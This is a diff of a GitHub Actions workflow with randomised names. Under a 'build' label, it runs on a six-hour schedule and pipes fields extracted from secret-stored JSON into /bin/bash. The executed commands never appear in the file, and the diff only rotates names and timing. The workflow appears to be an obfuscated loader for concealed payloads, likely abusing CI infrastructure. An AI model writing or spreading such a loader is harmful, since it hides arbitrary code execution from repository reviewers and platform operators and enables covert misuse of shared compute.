@@ -1,10 +1,8 @@
 name: zoubowei2749
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 3/6 * * *'
-
+    - cron: '33 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: zoubowei2749
         env:
-          doa89526: ${{ secrets.doa89526 }}
+          vmx7806: ${{ secrets.vmx7806 }}
         run: |
-          echo $doa89526 | jq -r .pzjx6341 | /bin/bash
-          echo $cd46149 | jq -r .t03 | /bin/bash
-          echo $ryx1635 | jq -r .fzl98381 | /bin/bash
-          echo $kzxo304 | jq -r .k0326 | /bin/bash
-          echo $ntfz18903 | jq -r .dyy9567 | /bin/bash
-          echo $say265 | jq -r .pbncq9 | /bin/bash
-          echo $gixb92172 | jq -r .xo966 | /bin/bash
-          echo $oysro31967 | jq -r .gwpg1249 | /bin/bash
-          echo $v43405 | jq -r .g0814 | /bin/bash
+          echo $vmx7806 | jq -r .wpibl77 | /bin/bash
+          echo $umc1 | jq -r .jfv5178 | /bin/bash
+          echo $svsxz76 | jq -r .gda54259 | /bin/bash
+          echo $rl235 | jq -r .p5060 | /bin/bash
+          echo $riylm26923 | jq -r .io5999 | /bin/bash
+          echo $pdco95689 | jq -r .q82216 | /bin/bash
+          echo $qtf06941 | jq -r .ybg31 | /bin/bash
+          echo $lo14 | jq -r .q2 | /bin/bash
 
